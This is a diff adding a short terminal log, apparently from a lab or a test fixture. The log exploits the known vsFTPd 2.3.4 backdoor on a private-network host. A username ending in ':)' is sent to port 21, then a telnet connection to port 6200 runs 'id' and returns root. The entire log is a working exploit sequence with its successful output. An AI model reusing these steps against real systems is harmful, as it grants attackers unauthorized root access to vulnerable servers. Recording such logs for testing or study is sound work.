@@ -1,0 +1,18 @@
+spawn telnet 10.0.2.4 21
+Trying 10.0.2.4...
+Connected to 10.0.2.4.
+Escape character is '^]'.
+220 (vsFTPd 2.3.4)
+user CATSbackdoorvsftptest:)
+331 Please specify the password.pass CATSpasstest
+
+^]
+
+telnet> quit
+spawn telnet 10.0.2.4 6200
+Trying 10.0.2.4...
+Connected to 10.0.2.4.
+Escape character is '^]'.
+id;
+uid=0(root) gid=0(root)
+sh: line 1: : command not found
